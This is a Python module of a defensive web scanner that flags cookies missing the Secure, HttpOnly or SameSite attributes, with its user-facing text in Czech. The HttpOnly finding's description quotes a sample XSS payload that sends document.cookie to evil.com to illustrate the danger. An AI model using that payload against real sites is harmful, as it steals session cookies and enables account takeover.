import re

from .base import BaseScanModule, Finding, Severity, guide_url


# Session-typed cookies (přihlášení, auth tokeny) — missing flag = CRITICAL,
# protože XSS/CSRF/MITM na takové cookies vede k převzetí účtu.
_SESSION_NAME_PATTERN = re.compile(
    r"(?:^|[_\-\.])"
    r"(?:session|sess|sid|auth|token|csrf|xsrf|jwt|phpsessid|jsessionid|connect)"
    r"(?:[_\-\.]|$)",
    re.IGNORECASE,
)


def _parse_cookie_name(set_cookie: str) -> str:
    """Extract cookie name from Set-Cookie header value."""
    return set_cookie.split("=", 1)[0].strip()


def _parse_cookie_flags(set_cookie: str) -> set[str]:
    """Extract flags from Set-Cookie header as lowercase set."""
    parts = set_cookie.split(";")
    flags = set()
    for part in parts[1:]:
        key = part.strip().lower().split("=")[0]
        flags.add(key)
    return flags


def _get_samesite_value(set_cookie: str) -> str | None:
    """Extract SameSite value (lax, strict, none) or None if missing."""
    for part in set_cookie.split(";")[1:]:
        stripped = part.strip().lower()
        if stripped.startswith("samesite"):
            if "=" in stripped:
                return stripped.split("=", 1)[1].strip()
            return ""
    return None


def _format_cookie_names(names: list[str]) -> str:
    """Format cookie names for finding detail, max 5."""
    if len(names) <= 5:
        return ", ".join(names)
    return ", ".join(names[:5]) + f" ... a {len(names) - 5} dalších"


def _is_session_cookie(name: str) -> bool:
    """Heuristika — jméno cookie indikuje session/auth/CSRF data."""
    if not name:
        return False
    return bool(_SESSION_NAME_PATTERN.search(name))


def _severity_for_missing(names: list[str]) -> Severity:
    """Severity podle: session cookie → CRITICAL, 3+ → WARNING, 1-2 → INFO."""
    if any(_is_session_cookie(n) for n in names):
        return Severity.CRITICAL
    if len(names) >= 3:
        return Severity.WARNING
    return Severity.INFO


class CookieScanner(BaseScanModule):
    name = "cookies"
    step_label = "Cookies & bezpečnostní flagy"

    def run(self, url: str, response=None) -> list[Finding]:
        if not response:
            return []

        set_cookies = [
            value for name, value in response.headers.multi_items()
            if name.lower() == "set-cookie"
        ]

        if not set_cookies:
            return []

        missing_secure: list[str] = []
        missing_httponly: list[str] = []
        missing_samesite: list[str] = []

        for cookie_str in set_cookies:
            name = _parse_cookie_name(cookie_str)
            flags = _parse_cookie_flags(cookie_str)

            if "secure" not in flags:
                missing_secure.append(name)

            if "httponly" not in flags:
                missing_httponly.append(name)

            samesite = _get_samesite_value(cookie_str)
            if samesite is None or samesite == "none":
                missing_samesite.append(name)

        findings: list[Finding] = []

        if missing_secure:
            findings.append(Finding(
                id="cookie-missing-secure",
                title=f"{len(missing_secure)} cookies bez Secure flagu",
                description="Cookies bez Secure flagu se odesílají i přes nezabezpečené HTTP spojení. Útočník na veřejné Wi-Fi může zachytit session cookie a převzít účet uživatele.",
                severity=_severity_for_missing(missing_secure),
                category="cookies",
                fix_url=guide_url("autentizace-sessions"),
                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                detail=_format_cookie_names(missing_secure),
            ))

        if missing_httponly:
            findings.append(Finding(
                id="cookie-missing-httponly",
                title=f"{len(missing_httponly)} cookies bez HttpOnly flagu",
                description="Cookies bez HttpOnly jsou čitelné přes document.cookie v JavaScriptu. Při XSS útoku stačí jeden řádek kódu: document.location='https://evil.com/?c='+document.cookie",
                severity=_severity_for_missing(missing_httponly),
                category="cookies",
                fix_url=guide_url("autentizace-sessions"),
                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                detail=_format_cookie_names(missing_httponly),
            ))

        if missing_samesite:
            findings.append(Finding(
                id="cookie-missing-samesite",
                title=f"{len(missing_samesite)} cookies bez SameSite ochrany",
                description="Cookies bez SameSite se odesílají i z cizích stránek. Útočník vytvoří formulář na svém webu, který odešle POST na váš server — prohlížeč přiloží cookies a akce proběhne za přihlášeného uživatele (CSRF).",
                severity=_severity_for_missing(missing_samesite),
                category="cookies",
                fix_url=guide_url("autentizace-sessions"),
                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute",
                detail=_format_cookie_names(missing_samesite),
            ))

        return findings
